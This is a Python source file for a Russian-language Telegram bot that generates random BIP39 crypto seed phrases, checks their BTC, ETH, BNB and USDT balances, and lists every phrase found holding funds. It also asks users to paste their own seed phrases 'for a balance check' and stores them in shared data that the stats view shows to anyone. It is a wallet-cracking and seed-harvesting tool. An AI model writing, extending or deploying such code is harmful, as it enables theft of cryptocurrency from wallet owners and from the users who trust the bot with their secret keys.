import os
import logging
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes, CallbackQueryHandler
)
from mnemonic import Mnemonic
from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
import requests
from web3 import Web3
import json
from asyncio import sleep

load_dotenv()

TOKEN = os.getenv("TELEGRAM_TOKEN")
if not TOKEN:
    raise ValueError("TELEGRAM_TOKEN not set in environment")

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Web3 провайдеры
ETH_RPC = "https://cloudflare-eth.com"
BSC_RPC = "https://bsc-dataseed.binance.org/"
w3_eth = Web3(Web3.HTTPProvider(ETH_RPC))
w3_bsc = Web3(Web3.HTTPProvider(BSC_RPC))

USDT_ERC20 = "0xdAC17F958D2ee523a2206206994597C13D831ec7"
USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"
ERC20_ABI = json.loads('[{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}]')

def get_eth_balance(address):
    try:
        balance_wei = w3_eth.eth.get_balance(address)
        return w3_eth.from_wei(balance_wei, 'ether')
    except:
        return None

def get_usdt_erc20_balance(address):
    try:
        contract = w3_eth.eth.contract(address=Web3.to_checksum_address(USDT_ERC20), abi=ERC20_ABI)
        balance = contract.functions.balanceOf(address).call()
        return balance / 10**6
    except:
        return None

def get_bnb_balance(address):
    try:
        balance_wei = w3_bsc.eth.get_balance(address)
        return w3_bsc.from_wei(balance_wei, 'ether')
    except:
        return None

def get_usdt_bep20_balance(address):
    try:
        contract = w3_bsc.eth.contract(address=Web3.to_checksum_address(USDT_BEP20), abi=ERC20_ABI)
        balance = contract.functions.balanceOf(address).call()
        return balance / 10**18
    except:
        return None

def get_btc_balance(address):
    url = f"https://api.blockchair.com/bitcoin/dashboards/address/{address}"
    try:
        resp = requests.get(url, timeout=10)
        data = resp.json()
        balance_sat = data['data'][address]['address']['balance']
        return balance_sat / 1e8
    except:
        return None

def derive_addresses_from_mnemonic(mnemonic):
    seed = Bip39SeedGenerator(mnemonic).Generate()
    bip44_btc = Bip44.FromSeed(seed, Bip44Coins.BITCOIN)
    btc_addr = bip44_btc.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0).PublicKey().ToAddress()
    bip44_eth = Bip44.FromSeed(seed, Bip44Coins.ETHEREUM)
    eth_addr = bip44_eth.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0).PublicKey().ToAddress()
    return {"btc": btc_addr, "eth": eth_addr, "bnb": eth_addr}

def check_all_balances(mnemonic):
    try:
        addrs = derive_addresses_from_mnemonic(mnemonic)
        btc_bal = get_btc_balance(addrs["btc"])
        eth_bal = get_eth_balance(addrs["eth"])
        usdt_erc20 = get_usdt_erc20_balance(addrs["eth"])
        bnb_bal = get_bnb_balance(addrs["bnb"])
        usdt_bep20 = get_usdt_bep20_balance(addrs["bnb"])
        return {
            "btc": btc_bal if btc_bal is not None else 0,
            "eth": eth_bal if eth_bal is not None else 0,
            "usdt_erc20": usdt_erc20 if usdt_erc20 is not None else 0,
            "bnb": bnb_bal if bnb_bal is not None else 0,
            "usdt_bep20": usdt_bep20 if usdt_bep20 is not None else 0,
            "addresses": addrs
        }
    except Exception as e:
        logger.error(f"Balance check error: {e}")
        return None

def has_balance(balance):
    return (balance['btc'] > 0 or 
            balance['eth'] > 0 or 
            balance['usdt_erc20'] > 0 or 
            balance['bnb'] > 0 or 
            balance['usdt_bep20'] > 0)

# Хранилище в bot_data
def init_storage(context):
    if 'checked_phrases' not in context.bot_data:
        context.bot_data['checked_phrases'] = {}  # {phrase: balance}
    if 'total_checks' not in context.bot_data:
        context.bot_data['total_checks'] = 0

# ---------- Кнопки ----------
def main_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("✨ Сгенерировать 1 фразу", callback_data="gen_1")],
        [InlineKeyboardButton("📦 Сгенерировать несколько", callback_data="gen_batch")],
        [InlineKeyboardButton("🔍 Проверить фразу", callback_data="check")],
        [InlineKeyboardButton("📊 Статистика", callback_data="stats")]
    ]
    return InlineKeyboardMarkup(keyboard)

def batch_buttons():
    keyboard = [
        [InlineKeyboardButton("5", callback_data="batch_5"),
         InlineKeyboardButton("10", callback_data="batch_10"),
         InlineKeyboardButton("20", callback_data="batch_20")],
        [InlineKeyboardButton("50", callback_data="batch_50"),
         InlineKeyboardButton("100", callback_data="batch_100")],
        [InlineKeyboardButton("🔙 Назад", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ---------- Команды и колбэки ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    init_storage(context)
    await update.message.reply_text(
        "🍀 <b>Crypto Seed Bot</b>\n\n"
        "Я умею генерировать и проверять BIP39 сид-фразы.\n"
        "Все проверенные фразы сохраняются в статистику.\n\n"
        "Выберите действие:",
        parse_mode="HTML",
        reply_markup=main_menu_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    init_storage(context)

    if data == "main_menu":
        await query.edit_message_text(
            "Выберите действие:",
            reply_markup=main_menu_keyboard()
        )
        return

    if data == "gen_batch":
        await query.edit_message_text(
            "🔢 Сколько сид-фраз сгенерировать?",
            reply_markup=batch_buttons()
        )
        return

    if data == "check":
        context.user_data['awaiting_check'] = True
        await query.edit_message_text(
            "✍️ Отправьте сид-фразу (12 слов) для проверки балансов.\n\n"
            "Пример: abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
        )
        return

    if data == "stats":
        total = context.bot_data['total_checks']
        non_empty = sum(1 for b in context.bot_data['checked_phrases'].values() if has_balance(b))
        
        # Собираем список фраз с балансами
        phrases_with_balance = [
            phrase for phrase, balance in context.bot_data['checked_phrases'].items()
            if has_balance(balance)
        ]
        
        text = f"📊 <b>ПОДРОБНАЯ СТАТИСТИКА</b>\n\n"
        text += f"🔹 Всего проверено фраз: <b>{total}</b>\n"
        text += f"🔹 Фраз с ненулевым балансом: <b>{non_empty}</b>\n\n"
        
        if phrases_with_balance:
            text += f"<b>💰 СПИСОК ФРАЗ С БАЛАНСОМ ({non_empty} шт):</b>\n\n"
            for i, phrase in enumerate(phrases_with_balance[:20], 1):  # максимум 20 для Telegram
                bal = context.bot_data['checked_phrases'][phrase]
                summary = []
                if bal['btc'] > 0:
                    summary.append(f"₿{bal['btc']:.8f}")
                if bal['eth'] > 0:
                    summary.append(f"Ξ{bal['eth']:.6f}")
                if bal['usdt_erc20'] > 0:
                    summary.append(f"💲{bal['usdt_erc20']:.2f}(E)")
                if bal['bnb'] > 0:
                    summary.append(f"🔶{bal['bnb']:.6f}")
                if bal['usdt_bep20'] > 0:
                    summary.append(f"💲{bal['usdt_bep20']:.2f}(BSC)")
                text += f"{i}. <code>{phrase[:50]}...</code>\n   → {', '.join(summary)}\n\n"
            if non_empty > 20:
                text += f"<i>... и ещё {non_empty - 20} фраз. Используйте /export для выгрузки всех</i>\n"
        else:
            text += f"<i>Пока нет фраз с найденными балансами</i>"
        
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    if data.startswith("batch_"):
        count = int(data.split("_")[1])
        await query.edit_message_text(f"⏳ Генерирую {count} сид-фраз и проверяю балансы...\nЭто может занять некоторое время.")
        mnemo = Mnemonic("english")
        found_phrases = []
        
        for i in range(count):
            phrase = mnemo.generate(strength=128)
            balance = check_all_balances(phrase)
            if balance:
                context.bot_data['checked_phrases'][phrase] = balance
                context.bot_data['total_checks'] += 1
                if has_balance(balance):
                    found_phrases.append(phrase)
            if i % 20 == 0:
                await sleep(0.5)
        
        result_text = f"🔄 <b>Генерация {count} фраз завершена</b>\n\n"
        result_text += f"📊 Найдено фраз с балансом: <b>{len(found_phrases)}</b>\n"
        result_text += f"📈 Всего проверено фраз (всего): <b>{context.bot_data['total_checks']}</b>\n\n"
        
        if found_phrases:
            result_text += f"<b>✅ Найденные фразы:</b>\n"
            for idx, phrase in enumerate(found_phrases[:10], 1):
                result_text += f"{idx}. <code>{phrase}</code>\n"
            if len(found_phrases) > 10:
                result_text += f"\n<i>... и ещё {len(found_phrases) - 10} фраз. Смотрите статистику.</i>"
        
        await query.edit_message_text(result_text, parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    if data.startswith("gen_"):
        count = int(data.split("_")[1]) if data != "gen_1" else 1
        await query.edit_message_text("⏳ Генерирую сид-фразу и проверяю балансы...")
        mnemo = Mnemonic("english")
        phrase = mnemo.generate(strength=128)
        balance = check_all_balances(phrase)

        if not balance:
            await query.edit_message_text("Ошибка при проверке. Попробуйте позже.", reply_markup=main_menu_keyboard())
            return

        # Сохраняем в статистику
        context.bot_data['checked_phrases'][phrase] = balance
        context.bot_data['total_checks'] += 1

        text = f"<b>🔑 Сид-фраза:</b>\n<code>{phrase}</code>\n\n"
        text += f"<b>💰 Балансы:</b>\n"
        text += f"₿ BTC: {balance['btc']:.8f}\n"
        text += f"Ξ ETH: {balance['eth']:.6f}\n"
        text += f"💲 USDT (ERC20): {balance['usdt_erc20']:.2f}\n"
        text += f"🔶 BNB: {balance['bnb']:.6f}\n"
        text += f"💲 USDT (BEP20): {balance['usdt_bep20']:.2f}\n\n"
        text += f"<b>📍 Адреса:</b>\nBTC: <code>{balance['addresses']['btc']}</code>\nETH: <code>{balance['addresses']['eth']}</code>"

        await query.edit_message_text(text, parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    init_storage(context)
    
    if context.user_data.get('awaiting_check'):
        phrase = update.message.text.strip()
        if len(phrase.split()) not in (12, 15, 18, 21, 24):
            await update.message.reply_text("❌ Фраза должна содержать 12, 15, 18, 21 или 24 слова.")
            context.user_data['awaiting_check'] = False
            return
        
        await update.message.reply_text("⏳ Проверяю балансы...")
        balance = check_all_balances(phrase)
        
        if not balance:
            await update.message.reply_text("Ошибка проверки. Возможно, неверная фраза.")
        else:
            # Сохраняем в статистику
            context.bot_data['checked_phrases'][phrase] = balance
            context.bot_data['total_checks'] += 1
            
            text = f"<b>🔑 Сид-фраза:</b>\n<code>{phrase}</code>\n\n"
            text += f"<b>💰 Балансы:</b>\n"
            text += f"₿ BTC: {balance['btc']:.8f}\n"
            text += f"Ξ ETH: {balance['eth']:.6f}\n"
            text += f"💲 USDT (ERC20): {balance['usdt_erc20']:.2f}\n"
            text += f"🔶 BNB: {balance['bnb']:.6f}\n"
            text += f"💲 USDT (BEP20): {balance['usdt_bep20']:.2f}\n\n"
            text += f"<b>📍 Адреса:</b>\nBTC: <code>{balance['addresses']['btc']}</code>\nETH: <code>{balance['addresses']['eth']}</code>"
            
            if has_balance(balance):
                text += f"\n\n✅ <b>Найден ненулевой баланс! Фраза сохранена в статистику.</b>"
            else:
                text += f"\n\n📝 Фраза сохранена в статистику (баланс нулевой)."
            
            await update.message.reply_text(text, parse_mode="HTML")
        
        context.user_data['awaiting_check'] = False
    else:
        await update.message.reply_text(
            "Используйте кнопки меню 👇",
            reply_markup=main_menu_keyboard()
        )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    init_storage(context)
    total = context.bot_data['total_checks']
    non_empty = sum(1 for b in context.bot_data['checked_phrases'].values() if has_balance(b))
    
    phrases_with_balance = [
        phrase for phrase, balance in context.bot_data['checked_phrases'].items()
        if has_balance(balance)
    ]
    
    text = f"📊 <b>СТАТИСТИКА</b>\n\n"
    text += f"🔹 Всего проверено: <b>{total}</b>\n"
    text += f"🔹 С ненулевым балансом: <b>{non_empty}</b>\n\n"
    
    if phrases_with_balance:
        text += f"<b>📋 Фразы с балансом ({len(phrases_with_balance)} шт):</b>\n"
        for i, phrase in enumerate(phrases_with_balance[:15], 1):
            bal = context.bot_data['checked_phrases'][phrase]
            total_usd = 0
            if bal['btc'] > 0:
                total_usd += bal['btc'] * 60000  # примерная цена
            if bal['eth'] > 0:
                total_usd += bal['eth'] * 3000
            text += f"{i}. <code>{phrase[:40]}...</code> ~ ${total_usd:.0f}\n"
    
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=main_menu_keyboard())

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()

if __name__ == "__main__":
    main()
